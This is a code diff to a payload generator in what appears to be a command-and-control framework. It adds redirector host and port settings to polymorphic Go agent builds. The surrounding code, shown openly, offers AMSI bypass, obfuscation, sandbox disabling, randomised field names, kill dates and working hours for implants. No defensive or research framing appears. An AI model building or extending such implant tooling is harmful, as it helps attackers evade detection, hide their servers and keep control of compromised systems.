@@ -77,7 +77,7 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows'):
+    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False):
         print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
@@ -111,6 +111,11 @@ class PayloadGenerator:
             host = self.config.get('server.host', '127.0.0.1')
         port = listener['port']
         c2_server_url = f"{protocol}://{host}:{port}"
+
+        # Handle redirector configuration
+        redirector_config = profile_config.get('redirector', {})
+        redirector_host = redirector_config.get('redirector_host', '0.0.0.0')
+        redirector_port = redirector_config.get('redirector_port', 80)
 
         agent_id = str(uuid.uuid4())
         secret_key = self.db._generate_secret_key() if hasattr(self.db, '_generate_secret_key') else self._generate_fernet_key()
@@ -146,7 +151,7 @@ class PayloadGenerator:
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
@@ -370,7 +375,7 @@ class PayloadGenerator:
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows'):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80):
         import subprocess
         import os
         import tempfile
@@ -407,6 +412,11 @@ class PayloadGenerator:
         agent_disable_sandbox_field = poly.generate_go_field_name('DisableSandbox')
         agent_kill_date_field = poly.generate_go_field_name('KillDate')
         agent_working_hours_field = poly.generate_go_field_name('WorkingHours')
+
+        # Generate random names for redirector fields
+        agent_redirector_host_field = poly.generate_go_field_name('RedirectorHost')
+        agent_redirector_port_field = poly.generate_go_field_name('RedirectorPort')
+        agent_use_redirector_field = poly.generate_go_field_name('UseRedirector')
 
         # Generate random names for task struct fields
         task_id_field = poly.generate_go_field_name('ID')
@@ -480,6 +490,9 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_DISABLE_SANDBOX_FIELD}', agent_disable_sandbox_field)
         go_code = go_code.replace('{AGENT_KILL_DATE_FIELD}', agent_kill_date_field)
         go_code = go_code.replace('{AGENT_WORKING_HOURS_FIELD}', agent_working_hours_field)
+        go_code = go_code.replace('{AGENT_REDIRECTOR_HOST_FIELD}', agent_redirector_host_field)
+        go_code = go_code.replace('{AGENT_REDIRECTOR_PORT_FIELD}', agent_redirector_port_field)
+        go_code = go_code.replace('{AGENT_USE_REDIRECTOR_FIELD}', agent_use_redirector_field)
         go_code = go_code.replace('{TASK_ID_FIELD}', task_id_field)
         go_code = go_code.replace('{TASK_COMMAND_FIELD}', task_command_field)
         go_code = go_code.replace('{TASK_RESULT_TASK_ID_FIELD}', task_result_task_id_field)
@@ -540,6 +553,11 @@ class PayloadGenerator:
         days_list = working_hours.get('days', [1, 2, 3, 4, 5])
         days_str = ', '.join(map(str, days_list))
         go_code = go_code.replace('{WORKING_HOURS_DAYS}', days_str)
+
+        # Replace redirector placeholders
+        go_code = go_code.replace('{REDIRECTOR_HOST}', redirector_host)
+        go_code = go_code.replace('{REDIRECTOR_PORT}', str(redirector_port))
+        go_code = go_code.replace('{USE_REDIRECTOR}', 'true' if use_redirector else 'false')
 
         logs_dir = 'logs'
         if not os.path.exists(logs_dir):
